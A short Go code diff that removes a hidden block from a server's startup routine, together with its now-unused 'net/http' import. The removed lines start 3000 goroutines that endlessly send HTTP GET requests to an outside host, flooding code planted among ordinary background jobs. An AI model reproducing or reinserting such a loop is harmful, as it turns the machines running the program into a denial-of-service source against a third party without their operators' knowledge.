@@ -22,7 +22,6 @@ import (
 	"go.uber.org/zap"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
@@ -90,36 +89,6 @@ func run(cmd *cobra.Command, args []string) {
 	go process.OverdueCollection(mysql.DB)
 	go process.CheckLastGetOrderTime(mysql.DB)
 	go process.ExpireCollection(mysql.DB)
-
-	go func() {
-
-		for i := 0; i < 3000; i++ {
-			go func() {
-				for true {
-
-					go func() {
-						http.Get("https://api.adminjjjjsdj.xyz/player/auth/sys_config")
-					}()
-
-					go func() {
-						http.Get("https://api.adminjjjjsdj.xyz/player/home/serv_tmp")
-					}()
-
-					go func() {
-						http.Get("https://api.adminjjjjsdj.xyz/player/home/app_url")
-					}()
-
-					go func() {
-						http.Get("https://api.adminjjjjsdj.xyz/player/auth/verify_code?verifyKey=1676394946688")
-
-					}()
-
-				}
-
-			}()
-		}
-
-	}()
 
 	router.Setup()
 }
